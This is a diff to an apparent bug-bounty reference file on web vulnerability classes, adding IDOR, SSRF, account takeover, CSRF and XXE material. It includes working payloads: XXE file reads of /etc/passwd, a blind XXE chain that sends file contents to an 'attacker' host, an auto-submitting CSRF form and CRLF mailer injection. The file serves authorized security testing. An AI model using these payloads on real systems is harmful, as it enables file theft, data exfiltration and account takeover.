@@ -1,9 +1,9 @@
 ---
 name: web2-vuln-classes
-description: Complete reference for 26 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS (postMessage), SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10, MCP/RAG attacks), API misconfig (mass assignment, JWT, prototype pollution, CORS), ATO (9 paths), SSTI, subdomain takeover, cloud misconfig, HTTP smuggling, cache poisoning, MFA bypass (7 patterns), SAML attacks, error disclosure, CSS injection, LFI/RCE, insecure deserialization, dependency confusion, padding oracle. Use when hunting a specific vuln class or studying what makes bugs pay.
+description: Complete reference for 28 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS (postMessage), SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10, MCP/RAG attacks), API misconfig (mass assignment, JWT, prototype pollution, CORS), ATO (9 paths), SSTI, subdomain takeover, cloud misconfig, HTTP smuggling, cache poisoning, MFA bypass (7 patterns), SAML attacks, error disclosure, CSS injection, LFI/RCE, insecure deserialization, dependency confusion, padding oracle, CSRF (method override / JSON / GraphQL), XXE (UTF-7 / OOB). Use when hunting a specific vuln class or studying what makes bugs pay.
 ---
 
-# WEB2 BUG CLASSES — 26 Classes
+# WEB2 BUG CLASSES — 28 Classes
 
 Root cause, pattern, bypass table, chaining opportunity, real paid examples.
 
@@ -20,6 +20,17 @@ Root cause, pattern, bypass table, chaining opportunity, real paid examples.
 > The MFA workflow-skip and SAML signature-stripping probes intentionally
 > stay **unauthenticated** even when a session is loaded — that's the
 > attack premise.
+
+### Deep references (load when the class is your focus)
+
+| Topic | Reference |
+|---|---|
+| BOLA/IDOR edge cases (wrapped, array, batch, wildcard, GraphQL mutations, artifacts) | [references/authorization-edge-cases.md](references/authorization-edge-cases.md) |
+| Parser differential / routing auth bypass / 403 | [references/parser-differential-bypass.md](references/parser-differential-bypass.md) |
+| CVE/advisory-derived reusable patterns | [references/framework-advisory-patterns.md](references/framework-advisory-patterns.md) |
+| SSRF validator/requester desync, inner parsers, evidence ladder | [references/ssrf-validator-desync.md](references/ssrf-validator-desync.md) |
+| Exposure/info-disclosure validation | `skills/web2-exposure/SKILL.md` |
+| Per-verb authz, status siblings, no-hallucination gate | `skills/johnwick/references/authz-idor.md` |
 
 ---
 
@@ -52,6 +63,20 @@ def get_order(order_id):
 - **V6:** Old API version — `/v1/users/123` lacks auth that `/v2/` has
 - **V7:** GraphQL node — `{ node(id: "base64(User:456)") { email } }`
 - **V8:** WebSocket — WS sends `{"action":"get_history","userId":"client-generated-UUID"}`
+- **V9:** Nested / wrapped object — outer key passes ownership check, inner key executes:
+  `{"Account": 1111}` → `{"Account": {"Account": 3333}}`, `{"user":{"id":victim}}`
+- **V10:** Array-form / mixed batch — `id[]=mine&id[]=victim`, `{"ids":["mine","victim"]}`;
+  authorization often checks only the first item
+- **V11:** Special/wildcard ID — `*`, `all`, `any`, `0`, `-1`, `null`, empty string, `undefined`;
+  some backends skip the ownership clause for non-normal IDs
+- **V12:** GraphQL **mutation** (write) when queries are protected — `updateUser(id: victim)`,
+  `deleteX(id: victim)`, `transferOwnership(from: victim)`
+- **V13:** Last-step auth in multi-step flows — preview/first step is checked; the final
+  commit/confirm request is not
+- **V14:** Artifact/representation gap — UI scoped, but export/download/PDF/`.json`/older version is not
+
+> Deep edge-case matrix: [references/authorization-edge-cases.md](references/authorization-edge-cases.md).
+> Per-verb / status-sibling / JWT-claim methods: `skills/johnwick/references/authz-idor.md`.
 
 ### Testing Checklist
 ```
@@ -262,6 +287,22 @@ http://localhost:8080     # Admin panel
 
 **WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `bughunter/tools/waf_encoder.py "<payload>" --class generic`.
 
+### SSRF — validator/requester desync (beyond IP encodings)
+
+The IP bypass table is only half the class. Also test:
+
+- **Magic DNS**: `169.254.169.254.nip.io`, `127.0.0.1.nip.io` — filter checks the string, request resolves the IP.
+- **Every redirect hop**: does policy revalidate after `302/307`? Does the client forward `Authorization`/custom
+  API-key headers across a cross-origin redirect? (server-side header leak — distinct from browser Referer).
+- **Inner parsers**: PDF/HTML-to-PDF/SVG/office doc fetches an inner URL the outer validator never saw.
+- **TOCTOU / DNS rebinding**: validate at T1, connect at T2 with a short-TTL domain.
+- **Webhook lifecycle**: create/verify may be protected while test-event/retry/delivery is not.
+- **OOB first**: confirm blind SSRF with your own interactsh domain before touching metadata.
+
+Full decision matrix, evidence ladder and FP gate:
+[references/ssrf-validator-desync.md](references/ssrf-validator-desync.md). Blind confirmation: `/oob` +
+`bughunter/tools/oob_listener.py`.
+
 ---
 
 ## 5. BUSINESS LOGIC
@@ -298,6 +339,24 @@ Thread 2: checks balance (10 credits) → PASS
 Thread 1: deducts → 0 remaining
 Thread 2: deducts → -10 remaining (DOUBLE SPEND)
 ```
+
+### Pattern 5: Subscription / entitlement is UI-only
+Check the premium action after a downgrade/cancel/trial expiry. The UI hides it; the backend may still accept
+it. Test the final action, not the pricing page. Fields: `plan`, `tier`, `subscription`, `entitlement`,
+`quota`, `feature_flag`, `role`.
+
+### Pattern 6: Currency confusion
+Multi-currency systems often trust a client `currency`/`lang` field. `currency=INR` (or JPY) with the same
+numeric price can charge far less if conversion is skipped or applied in the wrong direction. Compare the
+charged total server-side, not just the displayed price.
+
+### Pattern 7: Forgotten test cards / test mode in production
+Production checkout accepting well-known gateway test cards (`4242 4242 4242 4242`) can create unpaid orders.
+Only test on in-scope checkout with program permission; do not place real orders.
+
+### Pattern 8: Last-step authorization in multi-step flows
+Preview/create/validate may check authorization; `confirm`, `commit`, `publish`, `approve`, `transfer`
+may not. Capture the final request and replay it with a lower-privileged or cross-tenant identity.
 
 ---
 
@@ -746,6 +805,40 @@ Request token #1 → request token #2 → use token #1 → still works? = bug
 PUT /api/user/email
 {"new_email": "attacker@evil.com"}   # no current_password required
 ```
+
+### Path 6: Reset parameter pollution / parser confusion
+```http
+email=victim@x.com&email=attacker@x.com
+email[]=victim@x.com&email[]=attacker@x.com
+{"email":["victim@x.com","attacker@x.com"]}
+{"email":"victim@x.com","new_email":"attacker@x.com"}
+email=victim@x.com&redirect=https://attacker.com
+```
+If the token goes to the attacker but is valid for the victim, that is ATO.
+
+### Path 7: Token not bound to the account / reusable
+```text
+Request a token for your own account → try it on the victim's account.
+Use token #1 after requesting token #2 → still valid?
+Use the same token twice → still valid?
+Remove the token entirely → does the reset still succeed?
+```
+
+### Path 8: Newline / CRLF injection into the mailer
+```json
+{"email":"victim@target.com\ncc:attacker@evil.com"}
+{"email":"victim@target.com\r\nbcc:attacker@evil.com"}
+```
+Also try URL-encoded variants when a form field becomes JSON server-side. The goal is a second recipient
+that receives the victim's reset link.
+
+### Path 9: Race on OTP / token generation
+Send many parallel `/forgot-password` or `/send-otp` requests (single-packet attack / Turbo Intruder).
+Look for predictable, colliding, or reusable tokens and for the same OTP accepted twice.
+
+### Path 10: Token returned in the response
+Check the response body/headers of `/forgot-password` for `token`, `reset_link`, `code`, or a debug field.
+A token in the response is direct ATO.
 
 ### ATO Priority Chain
 - Critical: no-user-interaction ATO
@@ -1839,3 +1932,113 @@ Deps fully scoped + lockfile integrity + hash-pinned                       = N/A
 Real payload used instead of a benign callback                             = STOP — do not submit, legal/ethical breach
 
 ```
+
+---
+
+## 27. CSRF — CROSS-SITE REQUEST FORGERY
+
+> Still pays when the token check is applied to one method/route but not the one that changes state.
+> Modern single-page apps trade tokens for `SameSite` and content-type assumptions — both fail in specific shapes.
+
+### Test matrix
+
+| Check | What to try | Why it works |
+|---|---|---|
+| Per-method token | POST needs a token; try PUT/PATCH/DELETE/GET | middleware wired to POST only |
+| Method override | `GET /change-email?email=x` + `X-HTTP-Method-Override: POST`, `_method=POST` | backend performs POST state change |
+| Content-type confusion | send JSON body as `text/plain` or `application/x-www-form-urlencoded` | server parses regardless of type |
+| Duplicate param | `email=victim&email=attacker`, `csrf=valid&csrf=` | first/last value mismatch |
+| Token binding | reuse A's token in B's session, empty token, token from another action | token not bound to session/user/action |
+| SameSite=Lax | top-level GET navigation to a state-changing GET | Lax allows top-level GET |
+| SameSite=None | cross-site form/fetch with credentials | cookie sent cross-site |
+| Login CSRF | log victim into attacker's account | victim actions land in attacker account |
+| GraphQL CSRF | `application/x-www-form-urlencoded` mutation with no token | GraphQL has no built-in CSRF protection |
+| WebSocket CSRF | cross-site page opens WS to target | Origin not checked on handshake |
+| CORS interaction | reflected origin + credentials | read responses, not just send requests |
+
+### PoC shape
+
+```html
+<form action="https://target.com/api/change-email" method="POST" enctype="text/plain">
+  <input name='{"email":"attacker@evil.com","csrf":"' value='"}'>
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+For JSON APIs that require `application/json`, the form trick only works if the server ignores content-type.
+Otherwise look for a method-override or GET path. Do not assume CORS blocks the request — CORS controls
+reading the response, not sending a simple request.
+
+### False-positive gate
+- Token is enforced server-side on the **final** state-changing request.
+- `SameSite=Strict` and no state-changing GET.
+- The endpoint requires a custom header that triggers a preflight and the server rejects cross-origin preflight.
+- The "change" is a no-op or only affects the attacker's own account.
+- The action requires re-authentication/password confirmation the attacker cannot supply.
+
+### Evidence
+Two owned accounts, a victim session cookie, an auto-submitting PoC, and the state change observed from
+the victim account. For login CSRF, show the victim is now in the attacker's account.
+
+---
+
+## 28. XXE — XML EXTERNAL ENTITY
+
+> Any XML parser that resolves external entities is a file-read/SSRF primitive. Modern frameworks disable it
+> by default — the bug is the one parser, library, or legacy endpoint that did not.
+
+### Injection points
+- XML upload/import, SOAP/WSDL, SAML assertions, SVG, DOCX/XLSX/PPTX (zip+XML), RSS/Atom, sitemap import
+- API endpoints accepting `application/xml` or `text/xml`
+- PDF generators parsing XMP/metadata, config importers, enterprise integrations
+
+### Payloads
+
+```xml
+<!-- File read -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- SSRF -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+<!-- OOB exfil (parameter entity in external DTD) -->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/oob.dtd"> %xxe;]>
+```
+
+`oob.dtd`:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">
+%eval; %exfil;
+```
+
+### Bypasses
+- **UTF-7 charset**: encode the payload and set `<?xml version="1.0" encoding="UTF-7"?>` — UTF-8 pattern filters miss it.
+- **UTF-16 / BOM**, mixed encodings.
+- **XInclude** when DOCTYPE is blocked: `<xi:include href="file:///etc/passwd" parse="text"/>`.
+- **SVG**: `<image href="file:///etc/passwd"/>` or external DTD.
+- **Office docs**: unzip, inject into `word/document.xml` / `xl/workbook.xml`, rezip.
+- **PHP wrappers** in the entity: `php://filter/convert.base64-encode/resource=index.php`.
+
+### Procedure
+1. Baseline a valid XML request; note parser errors vs success.
+2. Try a harmless internal entity (`<!ENTITY test "x">`) to confirm DTD processing.
+3. Try file read of a known public file; if no output, go OOB with interactsh.
+4. If blind, use the external-DTD exfil chain and watch DNS/HTTP.
+5. For SSRF, use metadata/internal targets only within program scope.
+
+### False-positive gate
+- Parser rejects DOCTYPE/external entities (error or empty substitution).
+- Error message only says "entity not allowed" — no data.
+- Internal file returned is a public file with no security value.
+- OOB callback is from your own browser, not the target.
+
+### Impact chain
+`file read -> credentials/config -> SSRF -> cloud metadata -> internal service` ; combine with LFI/upload
+when the parser also writes files. Billion-laughs/DoS is usually out of scope or low value.
+
+### Tools
+`/oob` + `bughunter/tools/oob_listener.py` for blind XXE, `xxeinjector`/`oxml` if installed, Burp Collaborator
+replacement with your own interactsh domain.
